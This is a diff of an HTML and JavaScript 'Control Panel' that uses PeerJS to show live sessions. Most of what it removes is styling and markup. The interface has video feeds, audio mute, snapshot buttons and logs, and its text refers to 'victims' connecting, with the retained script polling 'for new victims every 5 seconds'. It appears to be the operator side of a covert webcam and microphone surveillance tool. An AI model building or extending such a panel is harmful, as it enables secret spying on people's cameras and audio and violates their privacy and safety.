@@ -1,90 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Control Panel</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: white; padding: 20px; }
-    .header { text-align: center; margin-bottom: 30px; }
-    h1 { background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 36px; }
-    .header p { color: #aaa; margin-top: 5px; }
-    .stats { text-align: center; margin-bottom: 20px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
-    .stat { background: rgba(255,255,255,0.1); padding: 12px 24px; border-radius: 20px; }
-    .stat .num { color: #667eea; font-weight: 700; }
-    .refresh-btn {
-      display: block; margin: 0 auto 25px; background: linear-gradient(135deg, #667eea, #764ba2);
-      color: white; border: none; padding: 12px 35px; border-radius: 50px;
-      font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s;
-    }
-    .refresh-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(118,75,162,0.4); }
-    .refresh-btn:active { transform: scale(0.96); }
-    .sessions { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
-    .session-card {
-      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 16px; padding: 20px; transition: all 0.3s;
-    }
-    .session-card:hover { border-color: rgba(102,126,234,0.4); }
-    .session-card h3 { color: #667eea; margin-bottom: 8px; font-size: 14px; word-break: break-all; }
-    .session-card .info { font-size: 12px; color: #888; margin-bottom: 12px; }
-    .session-card .info span { background: rgba(255,255,255,0.06); padding: 2px 8px; border-radius: 6px; }
-    .video-container { width: 100%; aspect-ratio: 16/9; background: #000; border-radius: 12px; overflow: hidden; margin: 12px 0; position: relative; }
-    .video-container video { width: 100%; height: 100%; object-fit: cover; }
-    .video-container .status-badge {
-      position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.6); padding: 4px 10px;
-      border-radius: 20px; font-size: 11px; color: #6bcb77; backdrop-filter: blur(5px);
-    }
-    .controls { display: flex; gap: 10px; margin-top: 12px; }
-    .controls button {
-      flex: 1; padding: 10px; border: none; border-radius: 10px;
-      font-weight: 600; cursor: pointer; transition: all 0.2s; font-size: 14px;
-    }
-    .controls button:active { transform: scale(0.95); }
-    .btn-audio { background: #6bcb77; color: #000; }
-    .btn-audio.muted { background: #ff6b6b; color: white; }
-    .btn-snap { background: #4d96ff; color: white; }
-    .no-sessions { grid-column: 1/-1; text-align: center; padding: 80px 20px; color: #555; font-size: 18px; }
-    .no-sessions .icon { font-size: 50px; margin-bottom: 15px; display: block; }
-    .logs {
-      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 16px; padding: 20px; margin-top: 30px; max-width: 1400px;
-      margin-left: auto; margin-right: auto; max-height: 300px; overflow-y: auto;
-    }
-    .logs h3 { margin-bottom: 10px; color: #667eea; }
-    .log {
-      background: rgba(0,0,0,0.3); padding: 8px 12px; border-radius: 8px;
-      margin: 5px 0; font-family: 'Consolas', monospace; font-size: 12px; color: #aaa;
-    }
-    .log.success { border-left: 3px solid #6bcb77; }
-    .log.error { border-left: 3px solid #ff6b6b; }
-    .log.info { border-left: 3px solid #4d96ff; }
-    @media (max-width: 500px) {
-      .sessions { grid-template-columns: 1fr; }
-      body { padding: 10px; }
-    }
-  </style>
-</head>
-<body>
-  <div class="header">
-    <h1>🎮 Control Panel</h1>
-    <p>Live Sessions via PeerJS</p>
-  </div>
-  <div class="stats">
-    <div class="stat">🟢 Active: <span class="num" id="count">0</span></div>
-    <div class="stat">📸 Snapshots: <span class="num" id="snaps">0</span></div>
-  </div>
-  <button class="refresh-btn" onclick="fetchPeers()">🔄 Refresh</button>
-  <div class="sessions" id="list">
-    <div class="no-sessions"><span class="icon">🔴</span>Waiting for victims to connect...</div>
-  </div>
-  <div class="logs">
-    <h3>📋 Live Logs</h3>
-    <div id="logs"></div>
-  </div>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.1/peerjs.min.js"></script>
-  <script>
     var controlPeer = null;
     var activeCalls = {};
     var knownPeers = {};
@@ -327,6 +241,4 @@
 
     // Poll for new victims every 5 seconds
     setInterval(fetchPeers, 5000);
-  </script>
-</body>
-</html>
+  
